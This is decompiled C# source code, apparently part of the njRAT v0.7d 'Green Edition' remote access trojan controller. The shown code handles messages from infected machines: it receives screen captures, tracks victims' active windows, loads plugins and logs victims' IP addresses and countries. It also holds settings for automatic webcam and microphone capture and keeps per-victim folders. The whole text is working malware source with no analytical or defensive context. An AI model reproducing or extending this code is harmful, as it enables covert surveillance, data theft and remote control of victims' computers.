																																						manager9.LPR.GClass9_ColumnClick(manager9.LPR, new ColumnClickEventArgs(0));
																																					}
																																					else
																																					{
																																						columnHeader_3.Tag = RuntimeHelpers.GetObjectValue((!Operators.ConditionalCompareObjectEqual(RuntimeHelpers.GetObjectValue(columnHeader_3.Tag), "+", false)) ? ((!Operators.ConditionalCompareObjectEqual(RuntimeHelpers.GetObjectValue(columnHeader_3.Tag), "-", false)) ? "-" : "+") : "-");
																																						manager9.LPR.GClass9_ColumnClick(manager9.LPR, new ColumnClickEventArgs(columnHeader_3.Index));
																																					}
																																				}
																																				manager9.PRNXT = true;
																																			}
																																		}
																																		else
																																		{
																																			flag5 = Operators.CompareString(text21, "RM", false) == 0;
																																			if (flag5)
																																			{
																																				int num49 = 2;
																																				int num50 = array2.Length - 1;
																																				for (int num51 = num49; num51 <= num50; num51++)
																																				{
																																					manager9.LPR.Items.RemoveByKey(array2[num51]);
																																				}
																																			}
																																			else
																																			{
																																				flag5 = Operators.CompareString(text21, "ER", false) != 0;
																																				if (!flag5)
																																				{
																																					manager9.SL.Text = array2[2];
																																				}
																																			}
																																		}
																																	}
																																}
																															}
																														}
																														else
																														{
																															flag5 = Operators.CompareString(text, "lv", false) != 0;
																															bool flag7;
																															if (flag5)
																															{
																																flag2 = Operators.CompareString(text, "ll", false) != 0;
																																if (flag2)
																																{
																																	flag = Operators.CompareString(text, "P", false) == 0;
																																	if (flag)
																																	{
																																		flag7 = client.L == null || client.L.Cells.Count <= Class7.int_10;
																																		if (flag7)
																																		{
																																			return;
																																		}
																																		Collection online = Class7.form1_0.S.Online;
																																		lock (online)
																																		{
																																			DataGridViewCell dataGridViewCell = client.L.Cells[Class7.int_10];
																																			int num52 = Conversions.ToInteger(array2[1]);
																																			dataGridViewCell.Style.ForeColor = ((num52 != 999) ? ((num52 < 500) ? ((num52 < 250) ? Color.LimeGreen : Color.LightGreen) : Color.GreenYellow) : Color.Orange);
																																			client.L.Cells[Class7.int_10].Value = array2[1] + "ms";
																																			return;
																																		}
																																	}
																																	flag7 = Operators.CompareString(text, "bla", false) == 0;
																																	if (flag7)
																																	{
																																		client.L.DefaultCellStyle.ForeColor = Class7.form1_0.L1.DefaultCellStyle.ForeColor;
																																		return;
																																	}
																																	flag7 = Operators.CompareString(text, "~", false) == 0;
																																	if (flag7)
																																	{
																																		client.Send("~");
																																		return;
																																	}
																																	flag7 = Operators.CompareString(text, "MSG", false) == 0;
																																	if (flag7)
																																	{
																																		flag5 = !Class7.class8_0.bool_5;
																																		if (flag5)
																																		{
																																			return;
																																		}
																																		Class7.form1_0.Pp1.WRT(new object[]
																																		{
																																			RuntimeHelpers.GetObjectValue(Color.Lime),
																																			Class6.smethod_13(),
																																			RuntimeHelpers.GetObjectValue(Color.DarkSlateBlue),
																																			client.COI,
																																			client.ip(),
																																			RuntimeHelpers.GetObjectValue(Color.LimeGreen),
																																			RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Class7.smethod_1(client.L)))),
																																			"\r\n",
																																			RuntimeHelpers.GetObjectValue(Color.Purple),
																																			"-->",
																																			RuntimeHelpers.GetObjectValue(Color.White),
																																			array2[1]
																																		});
																																		return;
																																	}
																																	else
																																	{
																																		flag7 = Operators.CompareString(text, "ER", false) == 0;
																																		if (flag7)
																																		{
																																			flag5 = !Class7.class8_0.bool_4;
																																			if (flag5)
																																			{
																																				return;
																																			}
																																			Class7.form1_0.Pp1.WRT(new object[]
																																			{
																																				RuntimeHelpers.GetObjectValue(Color.Lime),
																																				Class6.smethod_13(),
																																				RuntimeHelpers.GetObjectValue(Color.DarkSlateBlue),
																																				client.COI,
																																				client.ip(),
																																				RuntimeHelpers.GetObjectValue(Color.LimeGreen),
																																				RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Class7.smethod_1(client.L)))),
																																				"\r\n",
																																				RuntimeHelpers.GetObjectValue(Color.Purple),
																																				"-->",
																																				RuntimeHelpers.GetObjectValue(Color.White),
																																				array2[1] + " " + array2[2]
																																			});
																																			return;
																																		}
																																		else
																																		{
																																			flag7 = Operators.CompareString(text, "pl", false) == 0;
																																			if (flag7)
																																			{
																																				try
																																				{
																																					client.plg.Remove(array2[1]);
																																				}
																																				catch (Exception ex17)
																																				{
																																				}
																																				flag7 = Operators.CompareString(array2[2].ToString(), "0", false) == 0;
																																				if (flag7)
																																				{
																																					client.plg.Add(array2[1]);
																																					return;
																																				}
																																				Class7.smethod_2(client, Class7.smethod_0(null, array2[1]), Conversions.ToBoolean(array2[2]));
																																				return;
																																			}
																																			else
																																			{
																																				flag7 = Operators.CompareString(text, "CAP", false) == 0;
																																				if (flag7)
																																				{
																																					try
																																					{
																																						client.lastPC = DateAndTime.Now;
																																						client.Isend = false;
																																						byte[] array41 = (byte[])NewLateBinding.LateIndexGet(Class6.smethod_9(array, Class7.string_1), new object[] { RuntimeHelpers.GetObjectValue(1) }, null);
																																						flag7 = array41.Length < 10;
																																						if (flag7)
																																						{
																																							return;
																																						}
																																						client.L.Cells[0].Value = Image.FromStream(new MemoryStream(array41));
																																						return;
																																					}
																																					catch (Exception ex18)
																																					{
																																						return;
																																					}
																																				}
																																				bool flag8;
																																				if (Operators.CompareString(text, "act", false) == 0 && client.L != null)
																																				{
																																					if (Operators.CompareString(client.lastAC, array2[1], false) != 0)
																																					{
																																						flag8 = false;
																																						goto IL_518E;
																																					}
																																				}
																																				flag8 = true;
																																				IL_518E:
																																				flag7 = flag8;
																																				if (flag7)
																																				{
																																					return;
																																				}
																																				client.lastAC = array2[1];
																																				Collection online2 = Class7.form1_0.S.Online;
																																				lock (online2)
																																				{
																																					client.L.Cells[Class7.int_11].Value = Class6.smethod_16(array2[1]);
																																					return;
																																				}
																																			}
																																		}
																																	}
																																}
																															}
																															try
																															{
																																flag7 = client.L != null;
																																if (flag7)
																																{
																																	Class7.form1_0.L1.method_9(client.L);
																																}
																																List<object> list10 = new List<object>();
																																list10.Add(NJRAT_Resources.JPEG);
																																list10.Add(Class6.smethod_16(array2[1]));
																																list10.Add(Strings.Split(client.ip(), ":", -1, CompareMethod.Binary)[0]);
																																int num53 = 2;
																																int num54 = array2.Length - 2;
																																for (int num55 = num53; num55 <= num54; num55++)
																																{
																																	int num56 = num55 + 1;
																																	flag7 = num56 == Class7.int_11 - 1;
																																	if (flag7)
																																	{
																																		client.lastAC = array2[num55];
																																		list10.Add(Class6.smethod_16(array2[num55]));
																																	}
																																	else
																																	{
																																		flag7 = num56 == Class7.int_5;
																																		if (flag7)
																																		{
																																			list10.Add(client.COI);
																																			list10.Add(client.CName);
																																		}
																																		else
																																		{
																																			list10.Add(array2[num55]);
																																		}
																																	}
																																}
																																client.Folder = Conversions.ToString(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject(RuntimeHelpers.GetObjectValue(list10[Class7.int_2]), "_")), RuntimeHelpers.GetObjectValue(list10[Class7.int_3]))), "_")), Strings.Split(Conversions.ToString(RuntimeHelpers.GetObjectValue(list10[Class7.int_0])), "_", -1, CompareMethod.Binary)[Strings.Split(Conversions.ToString(RuntimeHelpers.GetObjectValue(list10[Class7.int_0])), "_", -1, CompareMethod.Binary).Length - 1])));
																																string text24 = "\\/<>?*:|\"";
																																int num57 = 0;
																																int length = text24.Length;
																																while (num57 < length)
																																{
																																	string text25 = Conversions.ToString(text24[num57]);
																																	client.Folder = client.Folder.Replace(text25, "%" + Conversion.Hex(Strings.Asc(text25)));
																																	num57++;
																																}
																																client.Folder = Application.StartupPath + "\\nj_users\\" + client.Folder + "\\";
																																client.L = Class7.form1_0.L1.method_8(client.ip(), list10.ToArray());
																																client.L.Tag = client;
																																list10.Clear();
																																client.plg.AddRange(Strings.Split(array2[array2.Length - 1], ",", -1, CompareMethod.Binary));
																															}
																															catch (Exception ex19)
																															{
																															}
																															flag7 = Class7.class8_0.bool_1;
																															if (flag7)
																															{
																																Class7.form1_0.Pp1.WRT(new object[]
																																{
																																	RuntimeHelpers.GetObjectValue(Color.Lime),
																																	Class6.smethod_13(),
																																	RuntimeHelpers.GetObjectValue(Color.DarkSlateBlue),
																																	client.COI,
																																	client.ip(),
																																	RuntimeHelpers.GetObjectValue(Color.LimeGreen),
																																	RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Class7.smethod_1(client.L)))),
																																	RuntimeHelpers.GetObjectValue(Color.DarkBlue),
																																	"Ready"
																																});
																															}
																															flag7 = !Class7.class8_0.bool_0;
																															if (!flag7)
																															{
																																Class7.notf_0.AddItem(client.COI, string.Format(NJRAT_Resources.notf, new object[]
																																{
																																	RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(client.L.Cells[Class7.int_2].Value))),
																																	RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(client.L.Cells[Class7.int_3].Value))),
																																	RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(client.L.Cells[Class7.int_7].Value))),
																																	RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(client.L.Cells[Class7.int_6].Value))),
																																	RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(client.L.Cells[Class7.int_9].Value))),
																																	RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(client.L.Cells[Class7.int_0].Value))),
																																	client.ip().Split(new char[] { ':' })[0]
																																}));
																															}
																														}
																													}
																												}
																											}
																										}
																									}
																								}
																							}
																						}
																					}
																				}
																			}
																		}
																	}
																}
															}
														}
													}
												}
											}
										}
									}
								}
							}
						}
					}
				}
			}
			catch (Exception ex20)
			{
				Exception ex21 = ex20;
				bool flag7 = (Operators.CompareString(array2[0], "up", false) == 0) | (Operators.CompareString(array2[0], "dw", false) == 0);
				if (flag7)
				{
					try
					{
						client.Send("close" + Class7.string_1 + array2[1]);
					}
					catch (Exception ex22)
					{
					}
				}
				else
				{
					flag7 = Operators.CompareString(array2[0].ToLower(), "cap", false) == 0;
					if (flag7)
					{
						client.Isend = false;
					}
					flag7 = Class7.class8_0.bool_3;
					if (flag7)
					{
						Class7.form1_0.Pp1.WRT(new object[]
						{
							RuntimeHelpers.GetObjectValue(Color.Lime),
							Class6.smethod_13(),
							RuntimeHelpers.GetObjectValue(Color.Lime),
							"Listner",
							RuntimeHelpers.GetObjectValue(Color.DarkRed),
							"ERR AT ",
							RuntimeHelpers.GetObjectValue(Color.White),
							array2[0],
							RuntimeHelpers.GetObjectValue(Color.Red),
							ex21.Message
						});
					}
				}
			}
		}

		// Token: 0x0600057A RID: 1402 RVA: 0x00141340 File Offset: 0x0013F740
		private static T InlineAssignHelper<T>(ref T target, T value)
		{
			target = value;
			return value;
		}

		// Token: 0x0400028A RID: 650
		public static Class7.Class8 class8_0 = new Class7.Class8();

		// Token: 0x0400028B RID: 651
		public static string string_0 = "njRAT v0.7d Green Edition By intcost";

		// Token: 0x0400028C RID: 652
		public static SK sk_0;

		// Token: 0x0400028D RID: 653
		public static long long_0 = 0L;

		// Token: 0x0400028E RID: 654
		public static long long_1 = 0L;

		// Token: 0x0400028F RID: 655
		public static string string_1 = "|'|'|";

		// Token: 0x04000290 RID: 656
		public static Form1 form1_0;

		// Token: 0x04000291 RID: 657
		public static int int_0 = 1;

		// Token: 0x04000292 RID: 658
		public static int int_1 = 2;

		// Token: 0x04000293 RID: 659
		public static int int_2 = 3;

		// Token: 0x04000294 RID: 660
		public static int int_3 = 4;

		// Token: 0x04000295 RID: 661
		public static int int_4 = 5;

		// Token: 0x04000296 RID: 662
		public static int int_5 = 6;

		// Token: 0x04000297 RID: 663
		public static int int_6 = 7;

		// Token: 0x04000298 RID: 664
		public static int int_7 = 8;

		// Token: 0x04000299 RID: 665
		public static int int_8 = 9;

		// Token: 0x0400029A RID: 666
		public static int int_9 = 10;

		// Token: 0x0400029B RID: 667
		public static int int_10 = 11;

		// Token: 0x0400029C RID: 668
		public static int int_11 = 12;

		// Token: 0x0400029D RID: 669
		public static List<string> list_0 = new List<string>();

		// Token: 0x0400029E RID: 670
		public static List<Class7.Class9> list_1 = new List<Class7.Class9>();

		// Token: 0x0400029F RID: 671
		public static notf notf_0 = new notf();

		// Token: 0x040002A0 RID: 672
		private static List<Client> list_2 = new List<Client>();

		// Token: 0x040002A1 RID: 673
		public static GClass3 gclass3_0 = new GClass3(Application.StartupPath + "\\GeoIP.dat", 1);

		// Token: 0x040002A2 RID: 674
		public static WaveOut waveOut_0;

		// Token: 0x040002A3 RID: 675
		public static WaveOut waveOut_1;

		// Token: 0x040002A4 RID: 676
		public static bool bool_0 = true;

		// Token: 0x0200002A RID: 42
		public sealed class Class8
		{
			// Token: 0x0600057B RID: 1403 RVA: 0x0014135C File Offset: 0x0013F75C
			[DebuggerNonUserCode]
			public Class8()
			{
			}

			// Token: 0x0600057C RID: 1404 RVA: 0x00141368 File Offset: 0x0013F768
			public void method_0()
			{
				this.bool_0 = Conversions.ToBoolean(Class6.smethod_2("ShowAlert", "TRUE"));
				this.bool_1 = Conversions.ToBoolean(Class6.smethod_2("LOGLOGIN", "TRUE"));
				this.bool_2 = Conversions.ToBoolean(Class6.smethod_2("LOGCONNECTIONS", "FALSE"));
				this.bool_3 = Conversions.ToBoolean(Class6.smethod_2("LOGLERR", "TRUE"));
				this.bool_4 = Conversions.ToBoolean(Class6.smethod_2("LOGRERR", "TRUE"));
				this.bool_5 = Conversions.ToBoolean(Class6.smethod_2("LOGMSGS", "TRUE"));
				this.bool_6 = Conversions.ToBoolean(Class6.smethod_2("SCAUT", "TRUE"));
				this.bool_9 = Conversions.ToBoolean(Class6.smethod_2("snd", "TRUE"));
				this.string_0 = Class6.smethod_2("SCI", "5");
				this.bool_7 = Conversions.ToBoolean(Class6.smethod_2("CAMAUT", "TRUE"));
				this.int_0 = Conversions.ToInteger(Class6.smethod_2("CAMI", "5"));
				this.bool_8 = Conversions.ToBoolean(Class6.smethod_2("MICAUT", "TRUE"));
				this.int_1 = Conversions.ToInteger(Class6.smethod_2("MICI", "1"));
				this.int_2 = Conversions.ToInteger(Class6.smethod_2("scri", "1"));
			}

			// Token: 0x0600057D RID: 1405 RVA: 0x001414E0 File Offset: 0x0013F8E0
			public void method_1()
			{
				Class6.smethod_3("ShowAlert", this.bool_0.ToString());
				Class6.smethod_3("snd", this.bool_9.ToString());
				Class6.smethod_3("LOGLOGIN", this.bool_1.ToString());
				Class6.smethod_3("LOGCONNECTIONS", this.bool_2.ToString());
				Class6.smethod_3("LOGLERR", this.bool_3.ToString());
				Class6.smethod_3("LOGRERR", this.bool_4.ToString());
				Class6.smethod_3("LOGMSGS", this.bool_5.ToString());
				Class6.smethod_3("SCAUT", this.bool_6.ToString());
				Class6.smethod_3("SCI", this.string_0.ToString());
				Class6.smethod_3("CAMAUT", this.bool_7.ToString());
				Class6.smethod_3("CAMI", this.int_0.ToString());
				Class6.smethod_3("MICAUT", this.bool_8.ToString());
				Class6.smethod_3("MICI", this.int_1.ToString());
				Class6.smethod_3("scri", this.int_2.ToString());
			}

			// Token: 0x040002A5 RID: 677
			public bool bool_0;

			// Token: 0x040002A6 RID: 678
			public bool bool_1;

			// Token: 0x040002A7 RID: 679
			public bool bool_2;

			// Token: 0x040002A8 RID: 680
			public bool bool_3;

			// Token: 0x040002A9 RID: 681
			public bool bool_4;

			// Token: 0x040002AA RID: 682
			public bool bool_5;

			// Token: 0x040002AB RID: 683
			public bool bool_6;

			// Token: 0x040002AC RID: 684
			public string string_0;

			// Token: 0x040002AD RID: 685
			public bool bool_7;

			// Token: 0x040002AE RID: 686
			public int int_0;

			// Token: 0x040002AF RID: 687
			public bool bool_8;

			// Token: 0x040002B0 RID: 688
			public int int_1;

			// Token: 0x040002B1 RID: 689
			public int int_2;

			// Token: 0x040002B2 RID: 690
			public bool bool_9;
		}

		// Token: 0x0200002B RID: 43
		public sealed class Class9
		{
			// Token: 0x0600057E RID: 1406 RVA: 0x00141624 File Offset: 0x0013FA24
			public Class9(string string_2)
			{
				byte[] array = File.ReadAllBytes(Application.StartupPath + "\\plugin\\" + string_2);
				bool flag = true;
				bool flag2 = flag;
				this.byte_0 = Class6.smethod_8(array, ref flag2);
				this.string_0 = string_2;
				this.string_1 = Class6.smethod_5(this.byte_0);
			}

			// Token: 0x040002B3 RID: 691
			public byte[] byte_0;

			// Token: 0x040002B4 RID: 692
			public string string_0;

			// Token: 0x040002B5 RID: 693
			public string string_1;
		}

		// Token: 0x0200002C RID: 44
		// (Invoke) Token: 0x06000582 RID: 1410
		public delegate void Delegate0(object object_0);
	}
}
